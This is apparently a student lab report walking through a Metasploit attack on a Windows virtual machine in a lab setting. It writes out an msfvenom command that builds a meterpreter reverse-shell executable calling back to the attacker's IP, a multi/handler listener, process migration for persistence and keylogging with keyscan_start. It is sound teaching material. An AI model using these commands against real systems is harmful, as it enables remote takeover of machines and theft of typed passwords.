Compromising windows using Metasploit
## Name: Yathin Reddy T
## Reg no: 212223100062
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
## OUTPUT :
![Screenshot 2025-04-26 135930](https://github.com/user-attachments/assets/accb0a09-7625-4dd1-9ac7-ca037571afa0)

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT :
![Screenshot 2025-04-26 135937](https://github.com/user-attachments/assets/d9500ab9-96f2-40ff-9622-f52d1661717d)

copy the fun.exe into the apache /var/www/html folder sudo systemctl apache2 start
Check the status of apache2
## OUTPUT :
![Screenshot 2025-04-26 135942](https://github.com/user-attachments/assets/97478a95-cac6-4d8d-8ec3-3867f0900649)

Invoke msfconsole:
## OUTPUT:
![Screenshot 2025-04-26 135948](https://github.com/user-attachments/assets/2223f988-715f-4649-8b62-4952627c86c6)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT :
![Screenshot 2025-04-26 135953](https://github.com/user-attachments/assets/1643868a-8fd6-4108-82b9-b61f38537b39)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
## OUPUT :
![Screenshot 2025-04-26 135958](https://github.com/user-attachments/assets/937b4753-47c8-4dee-9eee-82ae27b5f293)

WINDOWS :
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads
## BROWSE OUTPUT:
![Screenshot 2025-04-26 140006](https://github.com/user-attachments/assets/39627339-4c99-407c-a6c3-486ff86d1b68)

## DOWNLOAD OUTPUT:
![Screenshot 2025-04-26 140014](https://github.com/user-attachments/assets/0fd9a769-fbb0-4ec1-87e6-fb675d07d1a9)

## COME BACK TO PARROT:
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
## OUTPUT :
![Screenshot 2025-04-26 140020](https://github.com/user-attachments/assets/73612420-0e36-4cab-946a-0e88a7717ce2)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
## OUTPUT :
![Screenshot 2025-04-26 140027](https://github.com/user-attachments/assets/c3f471c1-1ba0-41f1-a5ce-dc161220feb4)

## WINDOWS OUTPUT :
![image](https://github.com/user-attachments/assets/9bb4652b-edf8-4cf8-bfab-334082d10fd8)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
